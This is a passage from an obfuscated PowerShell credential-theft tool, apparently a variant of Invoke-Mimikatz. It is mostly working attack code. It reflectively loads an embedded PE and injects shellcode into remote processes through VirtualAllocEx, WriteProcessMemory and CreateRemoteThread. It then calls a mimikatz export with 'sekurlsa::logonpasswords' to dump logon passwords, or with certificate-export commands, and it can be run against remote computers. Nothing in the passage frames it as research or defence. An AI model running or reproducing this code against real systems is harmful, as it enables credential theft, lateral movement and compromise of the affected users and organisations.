				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				${22} = f30 (${f4}.PEHandle) (${f4}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${21} = f33 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${20} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${22}, ${21})
				${20}.Invoke(${f4}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${22} = f30 (${27}) (${f4}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${f4}.PE64Bit -eq $true)
				{
					${40} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${39} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${36} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${40} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${39} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${36} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${33} = ${40}.Length + ${39}.Length + ${36}.Length + (${38} * 2)
				${37} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${33})
				${35} = ${37}
				f41 -f21 ${40} -f22 ${37}
				${37} = f30 ${37} (${40}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${27}, ${37}, $false)
				${37} = f30 ${37} (${38})
				f41 -f21 ${39} -f22 ${37}
				${37} = f30 ${37} (${39}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${22}, ${37}, $false)
				${37} = f30 ${37} (${38})
				f41 -f21 ${36} -f22 ${37}
				${37} = f30 ${37} (${36}.Length)
				${31} = $Win32Functions.VirtualAllocEx.Invoke(${f3}, [IntPtr]::Zero, [UIntPtr][UInt64]${33}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if (${31} -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				${4} = $Win32Functions.WriteProcessMemory.Invoke(${f3}, ${31}, ${35}, [UIntPtr][UInt64]${33}, [Ref]${34})
				if ((${4} -eq $false) -or ([UInt64]${34} -ne [UInt64]${33}))
				{
					Throw "Unable to write shellcode to remote process memory."
				}
				${6} = f29 -f16 ${f3} -f13 ${31} -Win32Functions $Win32Functions 
				${32} = $Win32Functions.WaitForSingleObject.Invoke(${6}, 20000)
				if (${32} -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				$Win32Functions.VirtualFreeEx.Invoke(${f3}, ${31}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${f4}.FileType -ieq "EXE")
		{
			[IntPtr]${f6} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${f6}, 0, 0x00)
			${28} = f40 -f4 ${f4} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -f10 ${f1} -f6 ${f6}
			[IntPtr]${30} = f30 (${f4}.PEHandle) (${f4}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: ${30}. Creating thread for the EXE to run in."
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${30}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${29} = [System.Runtime.InteropServices.Marshal]::ReadByte(${f6}, 0)
				if (${29} -eq 1)
				{
					f39 -f9 ${28} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		return @(${f4}.PEHandle, ${27})
	}
	Function f28
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${f2}
		)
		$Win32Constants = f36
		$Win32Functions = f38
		$Win32Types = f37
		${f4} = f34 -f2 ${f2} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${f4}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${23} = f30 ([Int64]${f4}.PEHandle) ([Int64]${f4}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${26} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${23}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${26}.Characteristics -eq 0 `
						-and ${26}.FirstThunk -eq 0 `
						-and ${26}.ForwarderChain -eq 0 `
						-and ${26}.Name -eq 0 `
						-and ${26}.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}
				${24} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((f30 ([Int64]${f4}.PEHandle) ([Int64]${26}.Name)))
				${25} = $Win32Functions.GetModuleHandle.Invoke(${24})
				if (${25} -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: ${24}. Continuing anyways" -WarningAction Continue
				}
				${4} = $Win32Functions.FreeLibrary.Invoke(${25})
				if (${4} -eq $false)
				{
					Write-Warning "Unable to free library: ${24}. Continuing anyways." -WarningAction Continue
				}
				${23} = f30 (${23}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		${22} = f30 (${f4}.PEHandle) (${f4}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${21} = f33 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${20} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${22}, ${21})
		${20}.Invoke(${f4}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${4} = $Win32Functions.VirtualFree.Invoke(${f2}, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if (${4} -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}
	Function f27
	{
		$Win32Functions = f38
		$Win32Types = f37
		$Win32Constants =  f36
		${f3} = [IntPtr]::Zero
		if ((${17} -ne $null) -and (${17} -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${18} = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if (${18}.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif (${18}.Count -gt 1)
			{
				${19} = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output ${19}
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				${17} = ${18}[0].ID
			}
		}
		if ((${17} -ne $null) -and (${17} -ne 0))
		{
			${f3} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, ${17})
			if (${f3} -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: ${17}"
			}
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
        try
        {
            ${16} = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }
        if (${16} -is [array])
        {
            ${15} = ${16}[0]
        } else {
            ${15} = ${16}
        }
        if ( ( ${15}.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + ${15}.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]${f5} = [Byte[]][Convert]::FromBase64String(${2})
        }
        else
        {
            [Byte[]]${f5} = [Byte[]][Convert]::FromBase64String(${1})
        }
        ${f5}[0] = 0
        ${f5}[1] = 0
		${f2} = [IntPtr]::Zero
		if (${f3} -eq [IntPtr]::Zero)
		{
			${14} = f35 -f5 ${f5} -f1 ${f1}
		}
		else
		{
			${14} = f35 -f5 ${f5} -f1 ${f1} -f3 ${f3}
		}
		if (${14} -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		${f2} = ${14}[0]
		${7} = ${14}[1] 
		${f4} = f34 -f2 ${f2} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if ((${f4}.FileType -ieq "DLL") -and (${f3} -eq [IntPtr]::Zero))
		{
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]${13} = f32 -f2 ${f2} -f8 "powershell_reflective_mimikatz"
				    if (${13} -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    ${12} = f33 @([IntPtr]) ([IntPtr])
				    ${11} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${13}, ${12})
                    ${10} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${f1})
				    [IntPtr]${8} = ${11}.Invoke(${10})
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${10})
				    if (${8} -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        ${9} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${8})
				        Write-Output ${9}
				        $Win32Functions.LocalFree.Invoke(${8});
				    }
		}
		elseif ((${f4}.FileType -ieq "DLL") -and (${f3} -ne [IntPtr]::Zero))
		{
			${5} = f32 -f2 ${f2} -f8 "VoidFunc"
			if ((${5} -eq $null) -or (${5} -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			${5} = f31 ${5} ${f2}
			${5} = f30 ${5} ${7}
			${6} = f29 -f16 ${f3} -f13 ${5} -Win32Functions $Win32Functions 
		}
		if (${f3} -eq [IntPtr]::Zero)
		{
			f28 -f2 ${f2}
		}
		else
		{
			${4} = $Win32Functions.VirtualFree.Invoke(${f2}, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if (${4} -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		Write-Verbose "Done!"
	}
	f27
}
Function f27
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	Write-Verbose "PowerShell ProcessID: $PID"
	if ($PsCmdlet.ParameterSetName -ieq "DumpTest")
	{
		${f1} = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        ${f1} = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        ${f1} = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock ${3} -ArgumentList @(${2}, ${1}, "Void", 0, "", ${f1})
	}
	else
	{
		Invoke-Command -ScriptBlock ${3} -ArgumentList @(${2}, ${1}, "Void", 0, "", ${f1}) -ComputerName $ComputerName
	}
}
f27
}